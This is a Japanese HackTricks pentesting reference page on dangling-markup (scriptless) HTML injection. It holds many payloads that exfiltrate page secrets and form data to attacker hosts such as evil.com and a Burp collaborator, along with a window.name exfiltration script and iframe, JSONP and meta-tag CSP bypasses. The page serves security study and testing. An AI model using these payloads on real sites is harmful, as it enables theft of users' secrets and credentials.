# Dangling Markup - HTML scriptless injection

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**したり、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する。
* **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)**と**[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)**のGitHubリポジトリにPRを提出する。**

</details>

## 要約

このテクニックは、**HTMLインジェクションが見つかったときにユーザーから情報を抽出する**ために使用できます。これは、[**XSS**](../xss-cross-site-scripting/)を**悪用する方法が見つからない**場合に非常に役立ちますが、**いくつかのHTMLタグをインジェクトできる**場合です。\
また、**秘密が平文で保存されている**場合にクライアントからそれを**外部に送信**したい場合や、スクリプトの実行を誤誘導したい場合にも役立ちます。

ここでコメントされているいくつかのテクニックは、予期しない方法で情報を外部に送信することによっていくつかの[**Content Security Policy**](../content-security-policy-csp-bypass/)をバイパスするために使用できます（htmlタグ、CSS、http-metaタグ、フォーム、baseなど）。

## 主な応用

### 平文の秘密を盗む

ページが読み込まれるときに`<img src='http://evil.com/log.cgi?`をインジェクトすると、被害者はインジェクトされた`img`タグとコード内の次の引用符の間のすべてのコードを送信します。そのチャンクに秘密がある場合、それを盗みます（同じことを二重引用符を使用して行うこともできます。より興味深いものを使用するかどうかを確認してください）。

`img`タグが禁止されている場合（たとえばCSPのため）、`<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`を使用することもできます。

```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```

注意してください。**Chromeは、"<"や"\n"を含むHTTP URL**をブロックしますので、"ftp"など他のプロトコルスキームを試すことができます。

CSSの`@import`を悪用することもできます（";"が見つかるまでコード全体を送信します）。

```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```

あなたは\*\*`<table`\*\*を使用することもできます:

```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```

以下は、`<base`タグを挿入することもできます。引用符が閉じられるまで、すべての情報が送信されますが、ユーザーの操作が必要です（ユーザーはリンクをクリックする必要があります。なぜなら、baseタグがリンクが指すドメインを変更しているためです）:

```html
<base target='        <--- Injected
steal me'<b>test</b>
```

### フォームの盗み取り

```html
<base href='http://evil.com/'>
```

### フォームの盗み取り 2

フォームヘッダーを設定します：`<form action='http://evil.com/log_steal'>` これにより、次のフォームヘッダーが上書きされ、フォームのすべてのデータが攻撃者に送信されます。

### フォームの盗み取り 3

ボタンは、属性 "formaction" を使用して、フォームの情報が送信されるURLを変更できます：

```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```

攻撃者はこれを使用して情報を盗むことができます。

この攻撃の例を[**この解説で見つける**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)ことができます。

### 明文の秘密を盗む2

最新のテクニックを使用してフォームを盗む（新しいフォームヘッダーを注入する）ことができ、その後新しい入力フィールドを注入できます：

```html
<input type='hidden' name='review_body' value="
```

そして、この入力フィールドには、HTML内の二重引用符と次の二重引用符の間のすべてのコンテンツが含まれます。この攻撃は、"_**Stealing clear text secrets**_"と"_**Stealing forms2**_"を組み合わせています。

同じことを、フォームと`<option>`タグを注入することで行うことができます。閉じられた`</option>`が見つかるまでのすべてのデータが送信されます：

```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```

### フォームパラメーターインジェクション

フォームのパスを変更し、新しい値を挿入することで、予期しないアクションが実行される可能性があります:

```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ← Injected lines

<form action="/change_settings.php">                        ← Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ← Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```

### noscriptを通じたクリアテキストの秘密情報の盗み出し

`<noscript></noscript>`は、ブラウザがJavaScriptをサポートしていない場合にその内容が解釈されるタグです（ChromeでJavaScriptを有効/無効にするには、[chrome://settings/content/javascript](chrome://settings/content/javascript)にアクセスしてください）。

攻撃者が制御するサイトに、挿入ポイントからWebページの内容を盗み出す方法は、次のように挿入することです：

```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```

### ユーザーインタラクションを使ったCSPのバイパス

この[portswiggersの研究](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)から、**最もCSPが制限された**環境でも、**ユーザーインタラクション**を使ってまだ**データを外部に送信**することができることがわかります。今回は、次のペイロードを使用します：

```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```

注意してください。**被害者**に**リンクをクリック**してもらい、それによって**あなたが制御する\*\*\*\*ペイロード**に**リダイレクト**されるようにします。また、**`base`タグ内の`target`属性には、次のシングルクォートまでのHTMLコンテンツ**が含まれていることにも注意してください。\
これにより、リンクがクリックされた場合の\*\*`window.name`**の**値**は、その**HTMLコンテンツ**全体になります。したがって、被害者がリンクをクリックしてアクセスしているページをあなたが制御しているため、その**`window.name`**にアクセスしてそのデータを**外部送信\*\*することができます。

```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```

### 誤解を招くスクリプトワークフロー1 - HTMLネームスペース攻撃

次のものを上書きし、スクリプトのフローに影響を与える値を持つ新しいタグをHTML内に挿入します。この例では、情報を共有する相手を選択しています：

```html
<input type='hidden' id='share_with' value='fredmbogo'>     ← Injected markup
...
Share this status update with:                              ← Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```

### 誤解を招くスクリプトワークフロー2 - スクリプト名前空間攻撃

HTMLタグを挿入してjavascript名前空間内に変数を作成します。その後、この変数はアプリケーションのフローに影響を与えます。

```html
<img id='is_public'>                                        ← Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ← The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ← Condition always evaluates to true
...
}
```

### JSONPの悪用

JSONPインターフェースを見つけた場合、任意のデータを使用して任意の関数を呼び出すことができるかもしれません：

```html
<script src='/editor/sharing.js'>:              ← Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ← Injected JSONP call
set_sharing({ ... })
```

または、JavaScript を実行しようとすることさえできます：

```html
<script src='/search?q=a&call=alert(1)'></script>
```

### Iframeの悪用

子ドキュメントは、親の`location`プロパティをクロスオリジンの状況でも表示および変更する機能を持っています。これにより、**iframe**内にスクリプトを埋め込み、クライアントを任意のページにリダイレクトすることが可能です。

```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```

これは次のように緩和することができます： `sandbox=' allow-scripts allow-top-navigation'`

また、別のページから機密情報を漏洩させるためにiframeを悪用することもできます **iframeのname属性を使用**。これは、**機密情報がiframeのname属性内に表示される**HTMLインジェクションを悪用して、自分自身をiframesするiframeを作成できるため、初期のiframeからその名前にアクセスして漏洩させることができるためです。

```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```

For more info check [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<metaの悪用

\*\*`meta http-equiv`\*\*を使用してCookieを設定するなど、**複数のアクション**を実行できます：`<meta http-equiv="Set-Cookie" Content="SESSID=1">`またはリダイレクトを実行する（この場合は5秒後に）：`<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

これは**http-equiv**に関する**CSP**で**回避**できます（`Content-Security-Policy: default-src 'self';`、または`Content-Security-Policy: http-equiv 'self';`）

### 新しい\<portal HTMLタグ

\<portalタグの脆弱性に関する非常に**興味深い研究**が[こちら](https://research.securitum.com/security-analysis-of-portal-element/)で見つけられます。\
この執筆時点では、Chromeで`chrome://flags/#enable-portals`でportalタグを有効にする必要があります。それ以外の場合は機能しません。

```html
<portal src='https://attacker-server?
```

### HTMLリーク

HTMLで接続情報を漏洩させる方法のすべてがDangling Markupに役立つわけではありませんが、時には役立つこともあります。こちらで確認できます：[https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SSリーク

これは**dangling markupとXS-Leaksのミックス**です。脆弱性の一方では、攻撃対象となるページと**同じオリジン**のページに**HTMLを注入**することができますが、もう一方では、HTMLを注入できるページを直接攻撃するのではなく、**別のページ**を攻撃します。

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Searchは**サイドチャネル攻撃を悪用してクロスオリジン情報を外部に送信**することを目的としています。したがって、これはDangling Markupとは異なる技術ですが、一部の技術はHTMLタグの含有を悪用します（JSの実行あり・なし）、例えば[**CSS Injection**](../xs-search/#css-injection)や[**Lazy Load Images**](../xs-search/#image-lazy-loading)**など**。

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## ブルートフォース検出リスト

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## 参考文献

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* \*\*💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする。
* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
